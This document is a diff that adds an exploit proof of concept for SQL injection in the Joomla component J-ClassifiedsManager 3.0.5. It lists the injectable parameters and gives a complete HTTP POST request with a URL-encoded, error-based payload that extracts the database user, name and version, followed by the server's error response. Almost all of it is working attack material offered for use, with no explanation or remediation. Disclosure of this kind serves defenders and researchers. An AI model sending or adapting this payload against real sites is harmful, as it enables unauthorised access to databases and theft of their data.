@@ -1,0 +1,44 @@
+# Exploit Title: Joomla! Component J-ClassifiedsManager 3.0.5 - SQL Injection
+# Dork: N/A
+# Date: 2019-01-23
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://cmsjunkie.com/
+# Software Link: https://extensions.joomla.org/extensions/extension/ads-a-affiliates/classified-ads/j-classifiedsmanager/
+# Version: 3.0.5
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/component/jclassifiedsmanager/
+# 
+
+&categorySearch=[SQL]
+&adType=[SQL]
+&citySearch=[SQL]
+
+POST /[PATH]/component/jclassifiedsmanager/ HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 779
+Cookie: __cfduid=d35dbe4de0d461bf69a9165df0f9691951548240991; 79a1b3ae870a3fab009030106c9fb887=eeab77f1b87057d5ad12b61071048ad6
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+searchKeyword=&categorySearch=&adType=&citySearch=1'%7c%7c%28%53%45%4c%45%43%54%20%27%45%66%65%27%20%46%52%4f%4d%20%44%55%41%4c%20%57%48%45%52%45 2%3d%32%20%41%4e%44%20%28%53%45%4c%45%43%54%20%32%20%46%52%4f%4d%28%53%45%4c%45%43%54%20%43%4f%55%4e%54%28%2a%29%2c%43%4f%4e%43%41%54%28%43%4f%4e%43%41%54%5f%57%53%28%30%78%32%30%33%61%32%30%2c%55%53%45%52%28%29%2c%44%41%54%41%42%41%53%45%28%29,%56%45%52%53%49%4f%4e%28%29%29%2c%28%53%45%4c%45%43%54%20%28%45%4c%54%28%32%3d%32%2c%31%29%29%29%2c%46%4c%4f%4f%52%28%52%41%4e%44%28%30%29%2a%32%29%29%78%20%46%52%4f%4d%20%49%4e%46%4f%52%4d%41%54%49%4f%4e%5f%53%43%48%45%4d%41%2e%50%4c%55%47%49%4e%53%20%47%52%4f%55%50%20%42%59%20%78%29%61%29%29%7c%7c%27&option=com_jclassifiedsmanager&controller=displayads&task=searchAds&view=displayads: undefined
+HTTP/1.1 500 Internal Server Error
+Date: Wed, 23 Jan 2019 15:06:56 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+P3P: CP="NOI ADM DEV PSAi COM NAV OUR OTRo STP IND DEM"
+Cache-Control: no-cache
+Pragma: no-cache
+Alt-Svc: h2=":443"; ma=60
+Server: cloudflare
+CF-RAY: 49d9cb37b64998d7-LAX
